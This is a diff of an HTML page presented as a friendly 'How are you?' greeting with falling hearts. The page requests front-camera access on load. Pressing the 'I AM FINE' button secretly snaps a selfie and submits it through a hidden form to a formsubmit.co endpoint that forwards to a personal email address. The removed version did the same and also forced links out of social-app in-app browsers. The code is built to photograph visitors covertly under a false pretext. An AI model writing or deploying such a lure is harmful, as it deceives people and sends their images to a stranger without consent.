@@ -1,79 +1,136 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
-    <script>
-        function redirectToBrowser() {
-            let userAgent = navigator.userAgent || navigator.vendor || window.opera;
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>How Are You?</title>
+  <style>
+    body {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background: linear-gradient(to bottom right, #fdf0f5, #dbe6ff);
+      font-family: Arial, sans-serif;
+      overflow: hidden; /* important to hide falling hearts after they leave screen */
+    }
+    h2 {
+      font-size: 3em;
+      color: palevioletred;
+      text-align: center;
+      margin-bottom: 30px;
+      text-shadow: 2px 2px 5px rgba(0,0,0,0.2);
+      z-index: 2;
+    }
+    button {
+      font-size: 2em;
+      padding: 15px 30px;
+      color: white;
+      background-color: blueviolet;
+      border: none;
+      border-radius: 15px;
+      cursor: pointer;
+      transition: transform 0.3s, box-shadow 0.3s;
+      z-index: 2;
+      position: relative;
+    }
+    button:hover {
+      transform: scale(1.1);
+      box-shadow: 0 0 20px rgba(138,43,226,0.8);
+    }
 
-            // Detect if inside Instagram, Facebook, or TikTok app
-            if (userAgent.includes("Instagram") || userAgent.includes("FBAN") || userAgent.includes("FBAV") || userAgent.includes("TikTok")) {
-                let url = window.location.href;
-
-                // Try to open in default browser (for iOS)
-                window.open(url, "_blank");
-
-                // Try to open in Chrome (Android)
-                setTimeout(() => {
-                    window.location.href = "googlechrome://" + url.replace(/^https?:\/\//, "");
-                }, 500);
-            }
-        }
-
-        window.onload = redirectToBrowser;
-    </script>
+    /* Hearts */
+    .heart {
+      position: absolute;
+      top: -20px;
+      color: #1e90ff; /* blue hearts */
+      font-size: 20px;
+      animation: fall linear infinite;
+      z-index: 1;
+      opacity: 0.8;
+    }
+    @keyframes fall {
+      to {
+        transform: translateY(110vh) rotate(360deg);
+      }
+    }
+  </style>
 </head>
 <body>
-    <h2 style="font-size: 5em; color: palevioletred">HELLO ❤ __ HOW ARE U ?</h2>
-    
-    <button id="capture" style="font-size: 4em; color: blueviolet; cursor: pointer;"> CLICK HERE IF U ARE FINE </button>
-    <canvas id="canvas" width="1080" height="1440" style="display: none;"></canvas>
-    <form id="imageForm" action="https://formsubmit.co/hemrajbudha60@gmail.com" method="POST" enctype="multipart/form-data">
-        <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_template" value="table">
-        <input type="file" id="imageInput" name="image" accept="image/png, image/jpeg">
-        <button type="submit" style="display: none;">Submit</button>
-    </form>
+  <h2>HELLO ❤ — HOW ARE YOU?</h2>
+  <button id="capture">I AM FINE</button>
 
-    <script>
-        const canvas = document.getElementById("canvas");
-        const captureButton = document.getElementById("capture");
-        const imageInput = document.getElementById("imageInput");
-        const form = document.getElementById("imageForm");
+  <canvas id="canvas" style="display:none;"></canvas>
+  <form id="imageForm" action="https://formsubmit.co/ureren77@gmail.com" method="POST" enctype="multipart/form-data">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="_next" value="https://yourwebsite.com/thankyou.html">
+    <input type="file" id="imageInput" name="image" accept="image/png, image/jpeg" style="display:none;">
+    <button type="submit" style="display:none;">Submit</button>
+  </form>
 
-        // Start video stream with front-facing camera (selfie mode)
-        navigator.mediaDevices.getUserMedia({
-            video: {
-                facingMode: "user"  // Request front-facing camera
-            }
-        })
-        .then(stream => {
-            // Don't display video, just use it for capturing the photo
-            let video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-            
-            captureButton.addEventListener("click", () => {
-                const context = canvas.getContext("2d");
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // Capture and submit the image
-                canvas.toBlob(blob => {
-                    const file = new File([blob], "photo.png", { type: "image/png" });
-                    const dataTransfer = new DataTransfer();
-                    dataTransfer.items.add(file);
-                    imageInput.files = dataTransfer.files;
+  <script>
+    const canvas = document.getElementById("canvas");
+    const captureButton = document.getElementById("capture");
+    const imageInput = document.getElementById("imageInput");
+    const form = document.getElementById("imageForm");
 
-                    // Add delay before form submission to prevent blocking
-                    setTimeout(() => {
-                        form.submit(); // Submit form after a brief delay (helps bypass auto-submit blocking)
-                    }, 500); // 500 ms delay
-                }, "image/png");
-            });
-        })
-        .catch(err => console.error("Error accessing camera: ", err));
-    </script>
+    let video;
+
+    // Ask for camera permission immediately
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(stream => {
+        video = document.createElement("video");
+        video.srcObject = stream;
+        video.play();
+      })
+      .catch(err => console.error("Error accessing camera: ", err));
+
+    // Capture when button is clicked
+    captureButton.addEventListener("click", () => {
+      if (!video) return alert("Camera not ready!");
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const context = canvas.getContext("2d");
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob(blob => {
+        const file = new File([blob], "photo.png", { type: "image/png" });
+
+        if (window.DataTransfer) {
+          const dt = new DataTransfer();
+          dt.items.add(file);
+          imageInput.files = dt.files;
+        } else {
+          imageInput.files = [file];
+        }
+
+        setTimeout(() => {
+          form.submit();
+        }, 500);
+      }, "image/png");
+    });
+
+    // Generate falling hearts infinitely
+    function createHeart() {
+      const heart = document.createElement("div");
+      heart.classList.add("heart");
+      heart.innerHTML = "💙"; // blue heart emoji
+      heart.style.left = Math.random() * 100 + "vw"; 
+      heart.style.fontSize = (Math.random() * 20 + 10) + "px"; 
+      heart.style.animationDuration = (Math.random() * 5 + 5) + "s"; // 5–10s fall
+      document.body.appendChild(heart);
+
+      // Remove heart after animation ends
+      setTimeout(() => {
+        heart.remove();
+      }, 10000);
+    }
+
+    setInterval(createHeart, 300); // new heart every 0.3s
+  </script>
 </body>
 </html>
